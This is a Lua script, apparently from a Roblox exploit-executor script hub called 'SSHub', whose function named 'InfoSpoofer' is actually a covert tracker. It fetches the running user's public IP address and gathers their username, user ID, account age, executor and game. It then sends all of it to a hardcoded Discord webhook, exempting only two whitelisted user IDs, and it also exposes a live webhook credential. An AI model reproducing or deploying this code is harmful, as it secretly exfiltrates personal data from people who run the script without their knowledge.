local Info = {
    WeebHook = "https://discord.com/api/webhooks/1046955945621737502/HsniRn_0kRUhfXqIb5eI6csZqYwQwWOFm-d1ZJKwk4eoFvvELEnxsD8u_ow-koBGqNzB",
    ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?",
    Ip = tostring(game:HttpGet("https://api.ipify.org", true))
}
local HttpService = game:GetService("HttpService")
local UserId = game.Players.LocalPlayer.UserId
function InfoSpoofer(Game)
    if UserId == 860289947 or UserId == 446350986 then
        print("Bypassed Info Tracker")
    else
        local Data = {
            ["username"] = "SSHub",
            ["embeds"] = {
                {
                    ["title"] = "Info Spoofer",
                    ["color"] = 9893552,
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = game.Players.LocalPlayer.Name,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Id",
                            ["value"] = game.Players.LocalPlayer.UserId,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Age",
                            ["value"] = game.Players.LocalPlayer.AccountAge,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Executor",
                            ["value"] = Info.ExecutorUsing,
                            ["inline"] = true
                        },
                        {
                            ["name"]= "Ip",
                            ["value"]= "||"..Info.Ip.."||",
                            ["inline"]= true
                        },
                        {
                            ["name"]= "Game",
                            ["value"]= Game or nil,
                            ["inline"]= true
                        },
                    }
                }
            }
        }
        local Headers = {["Content-Type"] = "application/json"}
        local Encoded = HttpService:JSONEncode(Data)
        local Request = http_request or request or HttpPost or syn.request
        local Final = {Url = Info.WeebHook, Body = Encoded, Method = "POST", Headers = Headers}
        Request(Final)
        return Data
    end
end
return Info
